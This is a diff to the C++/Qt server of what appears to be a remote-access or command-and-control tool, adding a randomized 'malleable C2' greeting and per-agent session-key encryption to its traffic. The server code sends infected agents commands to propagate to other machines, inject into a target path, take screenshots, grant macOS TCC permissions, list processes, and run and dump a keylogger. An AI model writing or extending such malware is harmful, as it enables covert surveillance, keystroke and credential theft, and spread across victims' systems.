@@ -1,5 +1,7 @@
 #include "../../include/network/server.hpp"
 #include "../../common/include/Opcodes.hpp"
+#include "../../common/include/CryptoContext.hpp"
+#include <openssl/rand.h>
 #include <iostream>
 #include <algorithm> // To use std::remove_if
 #include <iomanip>
@@ -100,11 +102,34 @@ void Server::run() {
             auto new_socket = m_listen_socket.acceptNode();
             if (new_socket.has_value()) {
                 emit statusMessage(QString("New Agent Connected: %1").arg(QString::fromStdString(new_socket->getIp())));
-                
-                // Immediately request system info (Phase 3 requirement)
-                Packet req(static_cast<uint16_t>(Opcode::SYS_REQ_INFO), "");
-                std::vector<uint8_t> data = req.serialize();
-                new_socket->sendData(data);
+
+                // Send malleable C2 greeting (64 random bytes)
+                uint8_t greeting[CryptoContext::GREETING_SIZE];
+                if (RAND_bytes(greeting, sizeof(greeting)) != 1) {
+                    std::fprintf(stderr, "[Server] Greeting generation failed\n");
+                    new_socket->close();
+                    continue;
+                }
+
+                bool sent = new_socket->sendRaw(greeting, sizeof(greeting));
+                std::fprintf(stdout, "[Server] Greeting sent to %s: %s\n",
+                            new_socket->getIp().c_str(), sent ? "OK" : "FAILED");
+                if (!sent) {
+                    new_socket->close();
+                    continue;
+                }
+
+                // Derive session key for this client
+                auto key = CryptoContext::deriveSessionKey(greeting);
+                if (key.size() != CryptoContext::SESSION_KEY_SIZE) {
+                    std::fprintf(stderr, "[Server] Greeting key derivation failed\n");
+                    new_socket->close();
+                    continue;
+                }
+                new_socket->setSessionKey(key.data(), key.size());
+
+                // Send SYS_REQ_INFO using malleable format
+                new_socket->sendPacket(static_cast<uint16_t>(Opcode::SYS_REQ_INFO), "");
 
                 m_clients.push_back({std::move(*new_socket), {}});
             }
@@ -153,9 +178,9 @@ uint16_t Server::getPort()   const { return m_port; }
 // Static Protocol Helper (Option B)
 void Server::processPacketBuffer(ClientContext& client) {
     while (true) {
-        auto packet_opt = ::inferno::Packet::deserialize(client.buffer);
+        auto packet_opt = client.socket.receivePacket(client.buffer);
         if (!packet_opt.has_value()) {
-            break; // Not enough data for a full packet yet
+            break;
         }
 
         // Dispatch Packet
@@ -310,8 +335,7 @@ void Server::sendPropagationCommand(const QString& ip, uint8_t cmd, const QStrin
             std::string payload;
             payload.push_back(static_cast<char>(cmd));
             payload.append(target.toStdString());
-            Packet p(static_cast<uint16_t>(Opcode::PROPAGATE), payload);
-            client.socket.sendData(p.serialize());
+            client.socket.sendPacket(static_cast<uint16_t>(Opcode::PROPAGATE), payload);
             break;
         }
     }
@@ -320,9 +344,8 @@ void Server::sendPropagationCommand(const QString& ip, uint8_t cmd, const QStrin
 void Server::sendInjectCommand(const QString& ip, const QString& targetPath) {
     for (auto& client : m_clients) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
-            std::string payload = targetPath.toStdString();
-            Packet p(static_cast<uint16_t>(Opcode::INJECT), payload);
-            client.socket.sendData(p.serialize());
+            client.socket.sendPacket(static_cast<uint16_t>(Opcode::INJECT),
+                                      targetPath.toStdString());
             break;
         }
     }
@@ -332,8 +355,7 @@ void Server::sendScreenshotCommand(const QString& ip, uint8_t subtype) {
     for (auto& client : m_clients) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
             std::string payload(1, static_cast<char>(subtype));
-            Packet p(static_cast<uint16_t>(Opcode::SCREENSHOT_REQ), payload);
-            client.socket.sendData(p.serialize());
+            client.socket.sendPacket(static_cast<uint16_t>(Opcode::SCREENSHOT_REQ), payload);
             break;
         }
     }
@@ -342,9 +364,8 @@ void Server::sendScreenshotCommand(const QString& ip, uint8_t subtype) {
 void Server::sendTccGrantCommand(const QString& ip, const QString& bundleId) {
     for (auto& client : m_clients) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
-            std::string payload = bundleId.toStdString();
-            Packet p(static_cast<uint16_t>(Opcode::TCC_GRANT), payload);
-            client.socket.sendData(p.serialize());
+            client.socket.sendPacket(static_cast<uint16_t>(Opcode::TCC_GRANT),
+                                      bundleId.toStdString());
             break;
         }
     }
@@ -353,8 +374,7 @@ void Server::sendTccGrantCommand(const QString& ip, const QString& bundleId) {
 void Server::requestProcessList(const QString& ip) {
     for (auto& client : m_clients) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
-            Packet p(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
-            client.socket.sendData(p.serialize());
+            client.socket.sendPacket(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
             break;
         }
     }
@@ -364,8 +384,7 @@ void Server::toggleKeylogger(const QString& ip, bool active) {
     for (auto& client : m_clients) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
             Opcode op = active ? Opcode::KEYLOG_START : Opcode::KEYLOG_STOP;
-            Packet p(static_cast<uint16_t>(op), "");
-            client.socket.sendData(p.serialize());
+            client.socket.sendPacket(static_cast<uint16_t>(op), "");
             break;
         }
     }
@@ -374,8 +393,7 @@ void Server::toggleKeylogger(const QString& ip, bool active) {
 void Server::requestKeylogDump(const QString& ip) {
     for (auto& client : m_clients) {
         if (QString::fromStdString(client.socket.getIp()) == ip) {
-            Packet p(static_cast<uint16_t>(Opcode::KEYLOG_DUMP), "");
-            client.socket.sendData(p.serialize());
+            client.socket.sendPacket(static_cast<uint16_t>(Opcode::KEYLOG_DUMP), "");
             break;
         }
     }
